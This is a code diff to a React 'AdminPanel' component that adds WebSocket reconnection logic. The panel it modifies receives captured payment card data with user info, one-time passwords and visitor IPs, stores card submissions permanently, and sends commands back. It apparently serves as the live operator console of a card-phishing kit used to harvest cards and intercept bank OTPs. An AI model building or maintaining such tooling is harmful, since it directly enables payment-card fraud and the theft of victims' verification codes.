@@ -38,83 +38,107 @@ const AdminPanel = () => {
   const [connectionStatus, setConnectionStatus] = useState<string>('Connecting...');
 
   useEffect(() => {
-    // Create WebSocket server connection
-    // For railway.com, use the appropriate WebSocket URL
-    const wsUrl = window.location.hostname === 'localhost' 
-      ? 'ws://localhost:8080' 
-      : `wss://${window.location.hostname}:${window.location.port || '443'}`;
-    
-    console.log('Attempting to connect to WebSocket:', wsUrl);
-    
-    const websocket = new WebSocket(wsUrl);
-    
-    websocket.onopen = () => {
-      console.log('Admin panel connected to WebSocket');
-      setConnectionStatus('Connected');
-    };
-    
-    websocket.onmessage = (event) => {
+    const connectWebSocket = () => {
+      // Enhanced WebSocket URL construction for different environments
+      let wsUrl: string;
+      
+      if (window.location.hostname === 'localhost') {
+        wsUrl = 'ws://localhost:8080';
+      } else {
+        // For production (railway.com or other hosting)
+        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const port = window.location.port ? `:${window.location.port}` : '';
+        wsUrl = `${protocol}//${window.location.hostname}${port}`;
+      }
+      
+      console.log('Attempting to connect to WebSocket:', wsUrl);
+      
       try {
-        const data = JSON.parse(event.data);
-        console.log('Received data in admin panel:', data);
+        const websocket = new WebSocket(wsUrl);
         
-        if (data.type === 'cardData') {
-          console.log('Processing card data:', data);
-          setCardData(data.data);
-          setUserInfo(data.userInfo);
-          setShowCommands(true); // Show commands when new card data arrives
-          
-          // Store card submission permanently
-          const newSubmission = {
-            cardData: data.data,
-            userInfo: data.userInfo,
-            timestamp: new Date(data.timestamp || new Date())
-          };
-          setCardSubmissions(prev => [...prev, newSubmission]);
-          
-        } else if (data.type === 'otp') {
-          console.log('Received OTP:', data.otp);
-          setOtp(data.otp);
-        } else if (data.type === 'newVisitor') {
-          console.log('Processing new visitor:', data);
-          const newVisitor = {
-            ip: data.ip,
-            timestamp: new Date(data.timestamp || new Date())
-          };
-          setVisitors(prev => {
-            // Check if visitor already exists to avoid duplicates
-            const exists = prev.some(v => v.ip === newVisitor.ip);
-            if (!exists) {
-              return [...prev, newVisitor];
+        websocket.onopen = () => {
+          console.log('Admin panel connected to WebSocket');
+          setConnectionStatus('Connected');
+          setWs(websocket);
+        };
+        
+        websocket.onmessage = (event) => {
+          try {
+            const data = JSON.parse(event.data);
+            console.log('Received data in admin panel:', data);
+            
+            if (data.type === 'cardData') {
+              console.log('Processing card data:', data);
+              setCardData(data.data);
+              setUserInfo(data.userInfo);
+              setShowCommands(true);
+              
+              // Store card submission permanently
+              const newSubmission = {
+                cardData: data.data,
+                userInfo: data.userInfo,
+                timestamp: new Date(data.timestamp || new Date())
+              };
+              setCardSubmissions(prev => [...prev, newSubmission]);
+              
+            } else if (data.type === 'otp') {
+              console.log('Received OTP:', data.otp);
+              setOtp(data.otp);
+            } else if (data.type === 'newVisitor') {
+              console.log('Processing new visitor:', data);
+              const newVisitor = {
+                ip: data.ip,
+                timestamp: new Date(data.timestamp || new Date())
+              };
+              setVisitors(prev => {
+                const exists = prev.some(v => v.ip === newVisitor.ip);
+                if (!exists) {
+                  return [...prev, newVisitor];
+                }
+                return prev;
+              });
             }
-            return prev;
-          });
-        }
+          } catch (error) {
+            console.error('Error parsing WebSocket message:', error);
+          }
+        };
+        
+        websocket.onclose = (event) => {
+          console.log('WebSocket connection closed', event.code, event.reason);
+          setConnectionStatus('Disconnected');
+          setWs(null);
+          
+          // Attempt to reconnect after 2 seconds
+          setTimeout(() => {
+            console.log('Attempting to reconnect...');
+            setConnectionStatus('Connecting...');
+            connectWebSocket();
+          }, 2000);
+        };
+
+        websocket.onerror = (error) => {
+          console.error('WebSocket error:', error);
+          setConnectionStatus('Error');
+          setWs(null);
+        };
+        
       } catch (error) {
-        console.error('Error parsing WebSocket message:', error);
+        console.error('Failed to create WebSocket connection:', error);
+        setConnectionStatus('Error');
+        setTimeout(() => {
+          console.log('Retrying connection...');
+          setConnectionStatus('Connecting...');
+          connectWebSocket();
+        }, 3000);
       }
     };
-    
-    websocket.onclose = (event) => {
-      console.log('WebSocket connection closed', event);
-      setConnectionStatus('Disconnected');
-      // Try to reconnect after 3 seconds
-      setTimeout(() => {
-        console.log('Attempting to reconnect...');
-        setConnectionStatus('Connecting...');
-        window.location.reload();
-      }, 3000);
-    };
 
-    websocket.onerror = (error) => {
-      console.error('WebSocket error:', error);
-      setConnectionStatus('Error');
-    };
-    
-    setWs(websocket);
+    connectWebSocket();
     
     return () => {
-      websocket.close();
+      if (ws) {
+        ws.close();
+      }
     };
   }, []);
 
@@ -123,7 +147,7 @@ const AdminPanel = () => {
       console.log('Sending command:', command);
       ws.send(JSON.stringify({ command }));
     } else {
-      console.error('WebSocket not connected');
+      console.error('WebSocket not connected, status:', connectionStatus);
     }
   };
 
